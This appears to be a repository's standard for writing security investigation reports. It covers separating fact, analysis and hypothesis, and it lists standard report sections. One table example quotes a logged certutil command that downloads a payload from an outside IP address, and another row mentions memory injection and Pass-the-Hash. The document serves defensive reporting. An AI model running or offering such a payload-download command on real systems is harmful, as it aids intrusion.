# Security Investigation & Threat Research Reporting Standard

Defensible reporting separates elite threat researchers from superficial analysts. Every research deliverable and completed investigation in this repository adheres to this standard.

---

## 1. The Fact / Analysis / Hypothesis Discipline

To maintain scientific integrity and credibility in legal or executive contexts, maintain clear boundaries:

| Category | Definition | Example Statement |
| :--- | :--- | :--- |
| **FACT** | Verifiable empirical data recorded in immutable logs. | *"At 14:22:15 UTC, host WS-0492 executed `certutil.exe -urlcache -split -f http://198.51.100.42/payload.bin` under user account `finance_jdoe`."* |
| **ANALYSIS** | Direct technical interpretation of observable facts. | *"The execution of certutil.exe with `-urlcache` represents living-off-the-land file ingress (MITRE ATT&CK T1105) designed to bypass default web proxy restrictions."* |
| **HYPOTHESIS** | Probable inference or attribution requiring further verification. | *"The adversary likely staged the payload in preparation for secondary memory injection into `explorer.exe` or lateral movement via Pass-the-Hash."* |

---

## 2. Standard Investigation Report Sections

1. **Executive Summary**: High-level impact, root cause, timeline summary, and business risk in non-technical terms.
2. **Scope & Affected Assets**: Systems, user accounts, cloud tenants, IP subnets, and data assets involved.
3. **Forensic Chronology / Timeline**: Unified UTC table of corroborated technical events.
4. **Adversary TTPs & ATT&CK Mapping**: Specific tactics, techniques, and procedures observed.
5. **Indicators of Compromise (IOCs)**: Formatted, defanged indicators (IPs, domains, hashes) with confidence levels.
6. **Detection Engineering Deliverables**: Concrete Sigma, YARA, or SIEM rules created to prevent recurrence.
7. **Remediation & Hardening Actions**: Immediate containment actions and long-term architectural mitigations.
